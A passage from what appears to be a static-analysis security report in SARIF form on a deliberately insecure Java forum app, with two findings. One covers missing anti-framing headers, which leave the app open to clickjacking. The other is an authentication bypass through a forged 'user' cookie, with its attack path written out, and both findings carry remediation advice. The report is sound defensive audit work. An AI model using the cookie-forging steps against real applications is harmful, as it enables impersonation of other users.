        {
          "ruleId": "html5",
          "level": "error",
          "message": {
            "text": "pagetemplate.tag renders the outer HTML frame for every page in the application. It does not emit any X-Frame-Options HTTP response header, nor does it include a Content-Security-Policy: frame-ancestors directive (either as an HTTP header or a <meta http-equiv> tag in <head>).\n\nNo HTTP response filter in the project sets these headers either (AuthenticationFilter only manages authentication state; no other servlet filter is present).\n\nBecause no framing restriction is in place, an attacker can embed any page of the forum inside an <iframe> on a malicious site and conduct UI-redressing (clickjacking) attacks — for example, tricking an authenticated user into submitting the compose-post form by overlaying transparent interface elements, or hijacking a login form to steal credentials.",
            "markdown": "`pagetemplate.tag` renders the outer HTML frame for every page in the application. It does not emit any `X-Frame-Options` HTTP response header, nor does it include a `Content-Security-Policy: frame-ancestors` directive (either as an HTTP header or a `<meta http-equiv>` tag in `<head>`).\n\nNo HTTP response filter in the project sets these headers either (`AuthenticationFilter` only manages authentication state; no other servlet filter is present).\n\nBecause no framing restriction is in place, an attacker can embed any page of the forum inside an `<iframe>` on a malicious site and conduct UI-redressing (clickjacking) attacks — for example, tricking an authenticated user into submitting the compose-post form by overlaying transparent interface elements, or hijacking a login form to steal credentials."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/main/webapp/WEB-INF/tags/pagetemplate.tag"
                },
                "region": {
                  "startLine": 4,
                  "snippet": {
                    "text": "<%@tag description=\"Main page template\" pageEncoding=\"UTF-8\"%>\n<%@taglib prefix=\"c\" uri=\"http://java.sun.com/jsp/jstl/core\"%>\n<html>\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Insecure Forum</title>\n    <link rel=\"stylesheet\" href=\"/css/fontawesome.min.css\">"
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "7BBCBFD1312D6EA327E60340F2159773"
          },
          "properties": {
            "impact": 2.5,
            "likelihood": 2.5,
            "snippetStartLine": 1,
            "summary": "pagetemplate.tag produces no X-Frame-Options or CSP frame-ancestors directive, leaving every application page vulnerable to clickjacking via iframe embedding.",
            "remediationSummary": "Add an X-Frame-Options: DENY (or CSP frame-ancestors 'none') HTTP response header via a servlet filter to prevent all pages from being embedded in attacker-controlled frames.",
            "remediation": "1. **Set the `X-Frame-Options: DENY` (or `SAMEORIGIN`) HTTP response header** on every response via a servlet filter (preferable) so that browsers refuse to load the page in any frame.\n2. Alternatively, add a `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`) header in the same filter.\n3. If a meta-tag approach is used as a secondary measure, add to the `<head>` in `pagetemplate.tag`:\n   ```html\n   <meta http-equiv=\"Content-Security-Policy\" content=\"frame-ancestors 'none'\">\n   ```\n   Note: HTTP headers are preferred because `<meta>` CSP does not support `frame-ancestors` in all browsers.\n4. When adopting Spring Security, configure `http.headers().frameOptions().deny()` to apply the header automatically."
          }
        },
        {
          "ruleId": "authentication-bad-practice",
          "level": "error",
          "message": {
            "text": "The entire authentication gate in AuthenticationFilter.doFilter reduces to:\n\nboolean loggedIn = cookies != null && stream(cookies).anyMatch(c -> \"user\".equals(c.getName()));\n\nThe only check performed is whether a cookie with the name \"user\" exists. The value of that cookie is never verified. There is no cryptographic signature, no HMAC, no server-side session record, and no expiry check. Any browser user can open DevTools and manually create a cookie named user with an arbitrary value (e.g. admin) and will immediately be treated as a fully authenticated user.\n\nSeparately, AuthenticationController.setCookie stores the raw username as the cookie value without any signing:\nCookie cookie = new Cookie(\"user\", username);\n\nAn attacker who sets user=alice can impersonate any registered account without knowing the password.\n\nAttack path: GET /messages/list → add a cookie user=anyvalue in the browser → full authenticated access to all protected endpoints.",
            "markdown": "The entire authentication gate in `AuthenticationFilter.doFilter` reduces to:\n\n```java\nboolean loggedIn = cookies != null && stream(cookies).anyMatch(c -> \"user\".equals(c.getName()));\n```\n\nThe only check performed is whether a cookie with the **name** `\"user\"` exists. The **value** of that cookie is never verified. There is no cryptographic signature, no HMAC, no server-side session record, and no expiry check. Any browser user can open DevTools and manually create a cookie named `user` with an arbitrary value (e.g. `admin`) and will immediately be treated as a fully authenticated user.\n\nSeparately, `AuthenticationController.setCookie` stores the raw username as the cookie value without any signing:\n```java\nCookie cookie = new Cookie(\"user\", username);\n```\nAn attacker who sets `user=alice` can impersonate any registered account without knowing the password.\n\n**Attack path:** `GET /messages/list` → add a cookie `user=anyvalue` in the browser → full authenticated access to all protected endpoints."
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "src/main/java/com/example/insecureforum/web/AuthenticationFilter.java"
                },
                "region": {
                  "startLine": 44,
                  "snippet": {
                    "text": "    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n        HttpServletRequest httpReq = (HttpServletRequest)request;\n        HttpServletResponse httpResp = (HttpServletResponse)response;\n        String path = httpReq.getServletPath();\n        Cookie[] cookies = httpReq.getCookies();\n        boolean loggedIn = cookies != null && stream(cookies).anyMatch(c -> \"user\".equals(c.getName()));\n        httpReq.setAttribute(\"loggedIn\", loggedIn);\n        if(whitelist.test(path)) {\n            logger.debug(\"Path {} matches whitelist, allowing\", path);\n            chain.doFilter(request, response);\n        } else {"
                  }
                }
              }
            }
          ],
          "fingerprints": {
            "fortify/instance-id": "C80A51BB30CC5738A8F5D9049DDA35A0"
          },
          "properties": {
            "impact": 4.5,
            "likelihood": 5,
            "snippetStartLine": 39,
            "summary": "Authentication decided solely by the presence of a cookie named \"user\" — any value, no integrity check.",
            "remediationSummary": "Replace cookie-existence check with a server-side session or HMAC-signed token; never trust an unsigned client-side cookie as proof of identity.",
            "remediation": "Replace the hand-rolled cookie check with a proper server-side session or a cryptographically signed token:\n\n1. **Server-side sessions (recommended):** Use the Servlet `HttpSession`. On successful login, call `request.getSession().setAttribute(\"username\", username)`. In the filter, check `session.getAttribute(\"username\") != null`.\n2. **Signed tokens:** If a stateless cookie is required, sign the cookie value with a strong HMAC (e.g. `javax.crypto.Mac` / HMAC-SHA256) using a secret key and verify the signature in the filter before trusting any identity claim.\n3. **Spring Security:** Replace the custom filter with Spring Security's session management, which handles all of this correctly out of the box.\n\nRegardless of approach, also set `HttpOnly` and `Secure` flags on the resulting cookie to prevent XSS-based theft and transmission over plain HTTP."
          }
        },
